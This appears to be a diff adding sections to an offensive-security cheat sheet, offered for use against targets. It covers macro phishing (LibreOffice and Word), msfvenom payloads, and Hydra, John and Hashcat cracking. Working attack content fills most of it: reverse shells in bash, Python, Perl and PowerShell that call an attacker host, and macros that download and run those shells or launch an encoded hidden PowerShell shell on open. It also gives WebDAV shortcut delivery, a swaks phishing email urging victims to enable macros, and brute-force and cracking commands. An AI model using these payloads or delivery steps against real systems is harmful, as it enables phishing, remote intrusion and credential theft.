@@ -4485,3 +4485,392 @@ Forces database errors to gather information about the backend:
 
 --- 
 
+## Macros
+
+## LibreOffice
+
+🎯 Step 1: Setup Netcat Listener
+
+Start your reverse shell catcher first:
+> ```bash
+> nc -lvnp 4444
+> ```
+🎯 Step 2: Generate Linux Payloads
+- Option A: Bash Reverse Shell (Simplest)
+> ```bash
+> echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > shell.sh
+> ```
+- Option B: ELF Executable (msfvenom)
+> ```bash
+> msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o shell.elf
+> ```
+- Option C: Meterpreter Bash
+> ```bash
+> msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f bash -o payload.sh
+> ```
+- Option D: Python Reverse Shell
+> ```bash
+> cat > shell.py << 'EOF'
+> import socket,subprocess,os
+> s=socket.socket()
+> s.connect(("<YOUR_IP>",4444))
+> os.dup2(s.fileno(),0)
+> os.dup2(s.fileno(),1)
+> os.dup2(s.fileno(),2)
+> subprocess.call(["/bin/sh","-i"])
+> EOF
+> ```
+- Option E: Perl Reverse Shell
+> ```bash
+> cat > shell.pl << 'EOF'
+> use Socket;$i="<YOUR_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");
+> EOF
+> ```
+🎯 Step 3: Host Payloads (Python Web Server)
+
+Serve files from your attack machine:
+> ```bash
+> python3 -m http.server 80
+> ```
+URLs become:
+
+    http://<YOUR_IP>/shell.sh
+    http://<YOUR_IP>/shell.elf
+    http://<YOUR_IP>/shell.py
+
+🎯 Step 4: LibreOffice Macro Payload
+- 1. Create Macro (LibreOffice Writer):
+- 2. Open LibreOffice Writer → Alt + F11
+- 3. Insert → Module → Name it Module1
+- 4. Paste this macro:
+
+> ```vb
+> Sub RunShell
+>     Shell("/bin/bash -c 'wget http://<YOUR_IP>/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh'")
+> End Sub
+> ```
+- 5. Save as update.odt (enable macros)
+
+- Macro Breakdown:
+
+ wget → Downloads payload
+ chmod +x → Makes executable  
+ /tmp/shell.sh → Triggers reverse shell
+
+🎯 Step 5: Deliver via Email (swaks)
+> ```bash
+> swaks --to target@example.com \
+>       --from attacker@example.com \
+>       --server smtp.example.com:587 \
+>       --auth LOGIN \
+>       --auth-user attacker@example.com \
+>       --auth-password 'your_password' \
+>       --attach update.odt \
+>       --header "Subject: Urgent Document Update" \
+>       --body "Please enable macros to view content."
+> ```
+🚀 Execution Flow
+
+1. Victim opens update.odt
+2. Enables macros (social engineering required)  
+3. Macro downloads shell.sh
+4. bash executes → reverse shell to YOUR nc listener
+5. 🎉 Access granted!
+
+## Microsoft Word
+
+1. Create the Powershell Payload
+- Payload
+> ```powershell
+> IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
+>
+>or
+>
+> powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
+>
+>or
+>
+> $client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+> ```
+
+2. Ecode the payload
+- Now Base64 encode it with UTF-16LE and LF (Unix)
+- https://www.base64decode.org/
+- https://gchq.github.io/CyberChef/
+### Example: 
+> ```text
+> SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEgATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAPABMAEgATwBTAFQAPgAgAC0AcAAgADwATABQAE8AUgBUAD4AIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA==
+> ```
+
+3. Using a python script to format
+- Use the base64 encoded payload
+> ```python
+> str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+>
+> n = 50
+>
+> for i in range(0, len(str), n):
+>     print("Str = Str + " + '"' + str[i:i+n] + '"') 
+> ```
+- Executing the script should look like:
+> ```python
+> python3 script.py 
+> Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
+> Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
+> Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
+> Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
+> Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
+> Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
+> Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
+> Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
+> Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
+> Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
+> Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
+> Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
+> Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
+> Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
+> Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
+> Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
+> Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
+> Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
+> Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
+> Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
+> Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
+> Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
+> Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
+> Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
+> Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
+> Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
+> Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
+> Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
+> ```
+
+4. The Final Macro should appear as follows:
+> ```vs
+> Sub AutoOpen()
+>    MyMacro
+> End Sub
+>
+> Sub Document_Open()
+>    MyMacro
+> End Sub
+> 
+> Sub MyMacro()
+>    Dim Str As String
+>    
+>    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
+>    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
+>    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
+>    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
+>    Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
+>    Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
+>    Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
+>    Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
+>    Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
+>    Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
+>    Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
+>    Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
+>    Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
+>    Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
+>    Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
+>    Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
+>    Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
+>    Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
+>    Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
+>    Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
+>    Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
+>    Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
+>    Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
+>    Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
+>    Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
+>    Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
+>    Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
+>    Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
+>
+>    CreateObject("Wscript.Shell").Run Str
+> End Sub
+> ```
+
+5. Installation of wsgidav
+> ```bash
+> pip install wsgidav
+> wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
+> ```
+
+6. config.Library.ms
+> ```vs
+> <?xml version="1.0" encoding="UTF-8"?>
+> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+> <name>@windows.storage.dll,-34582</name>
+> <version>6</version>
+> <isLibraryPinned>true</isLibraryPinned>
+> <iconReference>imageres.dll,-1003</iconReference>
+> <templateInfo>
+> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+> </templateInfo>
+> <searchConnectorDescriptionList>
+> <searchConnectorDescription>
+> <isDefaultSaveLocation>true</isDefaultSaveLocation>
+> <isSupported>false</isSupported>
+> <simpleLocation>
+> <url>http://<LHOST></url>
+> </simpleLocation>
+> </searchConnectorDescription>
+> </searchConnectorDescriptionList>
+> </libraryDescription>
+> ```
+
+7. Put the config.Library-ms file in the webdav folder
+
+8. Right-click on Windows to create a new shortcut file
+> ```powershell
+> powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
+> ```
+
+9. Put the shortcut file (*.lnk) into the webdav folder
+
+10. Send Phishing Email
+> ```bash
+> swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
+> ```
+
+---
+
+## Msfvenom
+
+| **Platform**                   | **Command**                                                                                                           |
+|---------------------------------|-----------------------------------------------------------------------------------------------------------------------|
+| **Linux**                       | ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf```                              |
+| **Windows**                     | ```msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe```                                |
+| **Apache Tomcat (JSP)**         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp```                               |
+| **Apache Tomcat (WAR)**         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war```                               |
+| **ASP**                         | ```msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp```                               |
+| **ASPX**                        | ```msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<443> -o shell64.aspx```                        |
+| **Bash**                        | ```msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh```                                    |
+| **JavaScript Shellcode**        | ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f js_le -o shellcode```                           |
+| **JSP**                         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp```                              |
+| **Perl**                        | ```msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl```                                    |
+| **PHP**              | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`                                           |
+| **PHP Additional**   | `cat shell.php \| pbcopy \&\& echo '<?php ' \| tr -d '\n' > shell.php \&\& pbpaste >> shell.php`               |
+| **Python**                      | ```msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py```                                  |
+| **WAR**                         | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war```                              |
+| **Linux Meterpreter (x86)**     | ```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf```                            |
+| **Linux Meterpreter (Bind)**    | ```msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf```                              |
+| **Linux Bind Shell (x64)**      | ```msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf```                                    |
+| **Linux Reverse Shell (x64)**   | ```msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf```                                 |
+| **Windows Meterpreter**         | ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe```                             |
+| **Windows Meterpreter HTTP**    | ```msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe``` |
+| **Windows Meterpreter Bind**    | ```msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe```                                |
+| **Windows CMD Multi Stage**     | ```msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe```                                    |
+| **Windows CMD Single Stage**    | ```msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe```                                   |
+| **Windows Add User**            | ```msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe```                                     |
+| **Mac Reverse Shell**           | ```msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho```                               |
+| **Mac Bind Shell**              | ```msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho```                                 |
+| **Python Shell**                | ```msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py```                                      |
+| **Bash Shell**                  | ```msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh```                                        |
+| **Perl Shell**                  | ```msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl```                                        |
+| **ASP Meterpreter**             | ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp```                             |
+| **JSP Shell**                   | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp```                                  |
+| **WAR Shell**                   | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war```                                 |
+
+---
+
+## Brute Forcing
+
+## Hydra
+
+- ### SSH Brute Force
+> ```bash
+> hydra -l <username> -P <wordlist> -s <port> ssh://<target_ip>
+> 
+- ### FTP Brute Force
+> ```bash
+> hydra -l <username> -P <wordlist> ftp://<target_ip>
+> ```
+- ### SMB Brute Force
+> ```bash
+> hydra -L <user_list> -P <password_list> smb://<target_ip>
+> ```
+- ### Telnet Brute Force
+> ```bash
+> hydra -l <username> -P <wordlist> telnet://<target_ip>
+> ```
+- ### MySQL Brute Force
+> ```bash
+> hydra -l <username> -P <wordlist> mysql://<target_ip>
+> ```
+- ### PostgreSQL Brute Force
+> ```bash
+> hydra -l <username> -P <wordlist> postgres://<target_ip>
+> ```
+- ### VNC Brute Force
+> ```bash
+> hydra -P <password_list> vnc://<target_ip>
+> ```
+- ### HTTP Basic Authentication Brute Force
+> ```bash
+> hydra -l <username> -P <wordlist> <target_ip> http-get /
+> ```
+- ### SMTP Brute Force
+> ```bash
+> hydra -l <username> -P <wordlist> smtp://<target_ip>
+> ```
+- ### SNMP Brute Force
+> ```bash
+> hydra -P <wordlist> snmp://<target_ip>
+> ```
+- ### Redis Brute Force
+> ```bash
+> hydra -P <password_list> redis://<target_ip>
+> ```
+- ### Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
+> ```bash
+> hydra -L <user_list> -p "<password>" rdp://<target_ip>
+> ```
+
+## John The Ripper
+
+| **Description** | **Command** |
+|-----------------|-------------|
+| **Basic Cracking** | `john <password_file>` |
+| **Show Cracked Passwords** | `john --show <password_file>` |
+| **List Supported Hash Formats** | `john --list=formats` |
+| **Resume Interrupted Cracking Session** | `john --restore` |
+| **Use Wordlist for Dictionary Attack** | `john --wordlist=<wordlist_file> <password_file>` |
+| **Incremental Mode (Brute Force)** | `john --incremental <password_file>` |
+| **Use External Mode for Custom Cracking** | `john --external=<mode> <password_file>` |
+| **Specify Hash Format for Optimization** | `john --format=<format> <password_file>` |
+| **Verbose Mode for Detailed Output** | `john --verbose <password_file>` |
+| **Extract Hash from Encrypted Office Files** | `office2john <file> > office.hash` |
+| **Crack Office File Password** | `john --wordlist=<wordlist> office.hash` |
+| **Extract Hashes from PDF Files** | `pdf2john <file.pdf> > pdf.txt` |
+| **Crack PDF Password using John** | `john --wordlist=<wordlist> pdf.txt` |
+| **Alternative PDF Password Cracking** | `pdfcrack -f <file.pdf> -w <wordlist>` |
+| **Extract Hashes from ZIP Files** | `zip2john <file.zip> > zip.hash` |
+| **Crack ZIP Password** | `john zip.hash --wordlist=<wordlist> --format=zip` |
+| **Brute-Force ZIP Password (Alternative)** | `fcrackzip -u -D -p <wordlist> <file.zip>` |
+| **Extract Hash from KeePass Database** | `keepass2john <Database.kdbx> > keepass.hash` |
+| **Set Permissions for SSH Private Key** | `chmod 600 <id_rsa>` |
+| **Convert SSH Key to John Format** | `ssh2john <id_rsa> > ssh.hash` |
+| **Crack SSH Key Passphrase** | `john --wordlist=<password_list> --rules=<rules_file> ssh.hash` |
+
+## Hashcat
+
+| **No.** | **Command** |
+|---------|-------------|
+| **1. Basic Dictionary Attack** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt` |
+| **2. Brute Force Attack** | `hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a` |
+| **3. Combination Attack** | `hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt` |
+| **4. Rule-Based Attack** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule` |
+| **5. Hybrid Attack (Wordlist + Mask)** | `hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d` |
+| **6. Specify Hash Type** | `hashcat -m 1000 hashes.txt wordlist.txt` |
+| **7. Show Cracked Passwords** | `hashcat -m 0 hashes.txt --show` |
+| **8. Benchmark Mode** | `hashcat -b` |
+| **9. Session Management** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt --session=mysession` |
+| **10. Resume Session** | `hashcat --session=mysession --restore` |
+| **11. Increment Mode** | `hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a --increment` |
+| **12. Custom Character Set** | `hashcat -m 0 -a 3 hashes.txt -1 ?l?u?d custom_mask.txt` |
+| **13. Output to File** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt -o cracked.txt` |
+| **14. Remove Cracked Hashes** | `hashcat -m 0 hashes.txt --show --left` |
+| **15. Help and Usage Information** | `hashcat -h`<br>Alternative usage: `hashcat --help` |
+
